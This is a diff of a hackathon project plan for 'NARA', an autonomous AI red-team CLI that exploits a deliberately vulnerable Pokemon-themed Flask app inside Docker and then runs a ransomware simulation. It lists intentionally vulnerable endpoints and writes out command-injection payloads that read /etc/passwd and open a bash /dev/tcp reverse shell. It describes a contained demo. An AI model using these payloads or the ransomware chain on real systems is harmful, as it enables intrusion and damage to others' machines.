@@ -1,4 +1,4 @@
-# Lifecycle — Autonomous Red Team Platform
+# NARA — Autonomous Red Team Platform
 
 ---
 
@@ -18,17 +18,17 @@
 >
 > **Prize:** $75 Visa Gift Card — Judge: Juliana Neelbauer
 
-**Lifecycle is submitted to both the Cybersecurity Track and targeting the NARA special award.**
+**NARA is submitted to both the Cybersecurity Track and targeting the NARA special award.**
 
 ---
 
 ## Overview
 
-An AI-powered penetration testing platform with a **Claude Code-style natural language CLI** called **Lifecycle**, invoked with `nara`. The user points it at a codebase, the platform autonomously scans it, plans an attack chain, then fires exploits into an isolated Docker container — streaming the entire kill chain live to the terminal.
+An AI-powered penetration testing platform with a **Claude Code-style natural language CLI** called **NARA**, invoked with `nara`. The user points it at a codebase, the platform autonomously scans it, plans an attack chain, then fires exploits into an isolated Docker container — streaming the entire kill chain live to the terminal.
 
 **LLM backend:** Ollama + Qwen2.5 for development (free, local). Claude API for demo (better reasoning). Switched via `.env`.
 
-The core market gap: security tools tell you *what* is vulnerable. Lifecycle shows you *what happens when it gets exploited* — in real time, autonomously, end to end.
+The core market gap: security tools tell you *what* is vulnerable. NARA shows you *what happens when it gets exploited* — in real time, autonomously, end to end.
 
 ---
 
@@ -93,16 +93,16 @@ Opens a persistent conversational session. The agent talks back, asks questions 
 ```
 $ nara
 
-  ╭──────────────────────────────────╮
-  │  Lifecycle — Autonomous Red Team  │
-  ╰──────────────────────────────────╯
+  ╭─────────────────────────────╮
+  │  NARA — Autonomous Red Team │
+  ╰─────────────────────────────╯
 
-lifecycle > hey, set up the environment
+nara > hey, set up the environment
 [+] Starting container... done
 [+] XFCE desktop + VNC ready on :5901
 Ready to go. Want me to scan something?
 
-lifecycle > yeah scan this repo
+nara > yeah scan this repo
 [SCANNER] Running Semgrep...
 [SCANNER] Running Bandit...
 [SCANNER] Found 3 vulnerabilities:
@@ -111,7 +111,7 @@ lifecycle > yeah scan this repo
   3. MEDIUM — Hardcoded secret in config.py:4
 Want me to exploit these?
 
-lifecycle > go for it, full chain
+nara > go for it, full chain
 [PLANNER] Designing kill chain...
   Step 1: Deploy vulnerable app in container
   Step 2: Exploit command injection via /ping endpoint
@@ -125,18 +125,18 @@ lifecycle > go for it, full chain
 [EXPLOITER] Response: www-data — shell access confirmed
 [RANSOMWARE] What image do you want for the ransom wallpaper?
 
-lifecycle > something scary, like a skull
+nara > something scary, like a skull
 [RANSOMWARE] Got it. Deploying payload...
 [RANSOMWARE] Wallpaper changed, icons modified, ransom note dropped
 [RANSOMWARE] ✓ Complete — check VNC :5901 to see the desktop
 
-lifecycle > what did you find?
+nara > what did you find?
 I found 3 vulnerabilities in the Flask app. The critical one was a command
 injection in the /ping endpoint — user input goes straight to os.system()
 with no sanitization. I exploited it to get shell access as www-data, then
 deployed the ransomware sim. Check VNC to see the desktop effects.
 
-lifecycle > exit
+nara > exit
 ```
 
 **Key behaviors:**
@@ -151,7 +151,7 @@ lifecycle > exit
 
 ```
 obv-nara-box/                           # THIS REPO — the nara CLI platform
-├── lifecycle/                  
+├── nara/                  
 │   ├── __init__.py
 │   ├── cli.py                  # Entry point — `nara` interactive REPL
 │   ├── orchestrator.py         # Routes NLP intent → agent pipeline
@@ -176,10 +176,13 @@ obv-nara-box/                           # THIS REPO — the nara CLI platform
 ├── setup.py                    # Makes `nara` a CLI command
 └── PLAN.md
 
-SEPARATE REPO (e.g., github.com/HackedRico/vuln-flask-app)
-  — Claude-generated vulnerable web app with command injection
-├── app.py                      # Flask app with deliberate injection flaws
-├── templates/                  # HTML templates
+SEPARATE REPO (e.g., github.com/HackedRico/pokedex-vuln)
+  — Claude-generated Pokemon-themed vulnerable web app
+├── app.py                      # Flask REST API with injection flaws
+├── templates/                  # Pokemon-themed HTML/CSS/JS frontend
+├── static/                     # Pokemon images, sprites, CSS
+├── pokedex.csv                 # Pokemon data (used in command injection endpoint)
+├── pokedex.db                  # SQLite DB (used in SQLi endpoint)
 └── requirements.txt
 ```
 
@@ -233,16 +236,45 @@ The Exploiter is told that XFCE + VNC exists in the container and can leverage t
 
 ---
 
-## Vulnerable Web App
+## Vulnerable Web App — Pokemon Themed
 
-A **Claude-generated** Flask web server with deliberate injection flaws — lives in a **separate public GitHub repo**.
+A **Claude-generated** Pokemon-themed web application with deliberate injection flaws — lives in a **separate public GitHub repo** (e.g., `github.com/HackedRico/pokedex-vuln`).
 
-**Vulnerabilities:**
-- Command injection — a "ping" / "network lookup" form passes user input to `os.system()` with no sanitization
-- Allows shell access via the web interface (e.g., `; cat /etc/passwd`, `; whoami`)
-- Basic HTML UI so it looks like a real application
+### Theme & UI
+- Pokemon-themed frontend — looks like a legit Pokedex / Pokemon lookup app
+- Clean, styled UI (HTML/CSS/JS) — not obviously a security demo at first glance
+- Pokemon imagery, search bars, cards, etc.
 
-**Why Claude-generated:** More meta — an AI builds the vulnerable app, another AI finds and exploits the vulns. Good story for NARA judges.
+### REST API Endpoints (All Deliberately Vulnerable)
+
+| Endpoint | Feature | Vulnerability |
+|---|---|---|
+| `GET /api/pokemon?name=<input>` | Pokemon lookup | Command injection — input passed to `os.system()` or `subprocess` unsanitized (e.g., `?name=pikachu; whoami`) |
+| `POST /api/team` | Save your Pokemon team | SQL injection — raw string concatenation into SQL query |
+| `GET /api/pokedex?search=<input>` | Search Pokedex | Reflected XSS — search term rendered back unsanitized |
+| `POST /api/upload-sprite` | Upload custom sprite | Unrestricted file upload — no extension/MIME validation, can upload `.py`, `.sh`, etc. |
+| `GET /api/stats?pokemon=<input>` | Fetch stats from "external API" | SSRF — user controls the URL being fetched server-side |
+
+### Key Vulnerability: Command Injection → Shell Access
+The primary exploit path for the demo:
+```
+GET /api/pokemon?name=pikachu;cat /etc/passwd
+GET /api/pokemon?name=pikachu;whoami
+GET /api/pokemon?name=pikachu;bash -c 'bash -i >& /dev/tcp/...'
+```
+User input goes straight to `os.system(f"grep {name} pokedex.csv")` with zero sanitization.
+
+### Tech Stack (Vulnerable App)
+- **Flask** (Python) — REST API backend
+- **HTML/CSS/JS** — Pokemon-themed frontend
+- **SQLite** — for the SQL injection endpoint
+- **No input validation anywhere** — every endpoint is exploitable
+
+### Why This Design
+- Looks like a real app someone would build (not obviously a CTF challenge)
+- Multiple vulnerability types for the Scanner to discover
+- Command injection is the clear path to shell access → ransomware chain
+- Pokemon theme makes the demo memorable and fun for judges
 
 ---
 
@@ -285,7 +317,7 @@ via docker exec:
   6. Confirm app is reachable
 ```
 
-### Container Lifecycle
+### Container NARA
 
 ```
 User types "init" in nara session
@@ -416,7 +448,7 @@ Dual backend with `.env` toggle — no code changes needed to switch.
 
 The Neelbauer Agent Revolution Award rewards autonomous agents that produce unexpected, unprompted output after initial training and prompting.
 
-Lifecycle hits every criterion:
+NARA hits every criterion:
 
 - **Autonomous** — human in the loop after the initial CLI prompt, and NLP user-feedback / decision-making
 - **Red teams software** — literally the core function
@@ -431,6 +463,6 @@ The moment an agent finds a vulnerability in code that *nobody knew existed* and
 
 Security tools tell you *what* is vulnerable.
 
-Lifecycle shows you *what happens when it gets exploited* — autonomously, in real time, end to end.
+NARA shows you *what happens when it gets exploited* — autonomously, in real time, end to end.
 
 That's the product.
